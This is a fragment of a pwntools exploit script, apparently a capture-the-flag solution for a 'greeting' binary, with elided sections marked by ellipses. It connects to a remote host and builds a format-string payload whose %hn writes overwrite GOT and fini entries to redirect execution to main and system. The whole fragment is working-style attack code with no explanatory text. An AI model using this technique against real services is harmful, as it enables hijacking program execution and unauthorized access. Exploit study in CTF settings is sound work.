...
# io = process("./greeting")
# gdb.attach(io)
io = remote('111.200.241.244',52446)
main_addr = 0x080485ED
system_plt = elf.plt['system']###08048490
strlen_got = elf.got['strlen']##08049A54
...
payload += p32(fin_addr)
payload += '%2020c%12$hn'###0x804- 2 - 12- 18(nice to meet you
payload += '%31884c%13$hn' ###  0x8490 -0x804
payload += '%349c%14$hn' ###  0x85ED -0x8490
